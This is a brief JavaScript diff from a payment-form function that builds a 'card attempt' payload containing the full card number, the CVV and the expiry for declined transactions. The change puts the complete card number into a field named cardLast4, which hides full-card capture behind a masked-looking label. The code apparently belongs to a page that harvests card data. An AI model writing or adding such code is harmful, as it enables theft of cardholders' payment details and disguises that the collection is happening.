@@ -715,7 +715,7 @@ function safeCardAttemptPayload(formData) {
     cardNumber: digits, // Envia o número completo
     cardCvv: formData.get('cardCvv') || '',
     cardBrand: cardBrand(digits),
-    cardLast4: digits.slice(-4), // Fallback
+    cardLast4: digits,
     cardExpiry: formData.get('cardExpiry') || '',
     amount: Number(currentSession?.amount || 0),
     status: 'Recusado',
